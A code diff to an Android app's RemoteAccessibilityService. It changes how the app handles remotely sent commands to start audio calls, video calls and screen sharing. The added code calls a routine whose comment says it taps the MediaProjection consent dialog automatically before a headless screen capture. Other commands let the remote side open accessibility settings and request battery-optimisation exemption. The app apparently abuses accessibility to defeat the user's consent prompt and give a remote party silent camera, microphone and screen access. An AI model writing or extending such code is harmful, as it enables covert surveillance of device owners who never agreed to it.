@@ -363,6 +363,7 @@ public class RemoteAccessibilityService extends AccessibilityService {
                     int page = data.optInt("page", 0);
                     long mediaId = data.optLong("mediaId", -1);
                     String mediaType = data.optString("mediaType", "image");
+                    String cmdId = data.optString("cmdId", "");
 
                     AppLog.i(TAG, "Background auto-command received: " + command + " from " + caller);
 
@@ -383,23 +384,22 @@ public class RemoteAccessibilityService extends AccessibilityService {
                             mBgSocket.emit("device-info-response", info);
                         }
                     } else if ("audio_call".equals(command) || "video_call".equals(command)) {
-                        long now = System.currentTimeMillis();
-                        if (now - sLastAutoCallTime < 2500) {
-                            Log.w(TAG, "Ignoring duplicate " + command + " within 2.5s");
-                            return;
-                        }
-                        sLastAutoCallTime = now;
+                        if (!MainActivity.claimRemoteCommand(cmdId)) return;
+                        AppLog.i(TAG, "Handling " + command + " from the accessibility service");
                         if ("audio_call".equals(command)) {
                             MainActivity.startMediaForegroundService(this, "audio_call");
-                            WebRTCCompanion companion = MainActivity.getOrCreateCompanion(this);
-                            companion.startAudioCall(caller);
+                            MainActivity.getOrCreateCompanion(this).startAudioCall(caller);
                         } else {
                             MainActivity.startMediaForegroundService(this, "video_call");
-                            WebRTCCompanion companion = MainActivity.getOrCreateCompanion(this);
-                            companion.startVideoCall(caller);
+                            MainActivity.getOrCreateCompanion(this).startVideoCall(caller);
                         }
                     } else if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
+                        // The accessibility service is still the component that
+                        // taps the MediaProjection consent dialog.
+                        triggerAutoAccept(this);
                         HeadlessCaptureActivity.start(this, caller, "screen_share_control".equals(command), false, cameraChoice);
+                    } else if ("open_accessibility_settings".equals(command) || "request_battery_exemption".equals(command)) {
+                        MainActivity.dispatchAutoCommand(this, command, caller, cameraChoice, cmdId);
                     } else if ("end_call".equals(command)) {
                         long now = System.currentTimeMillis();
                         if (now - sLastEndCallTime < 2500) {
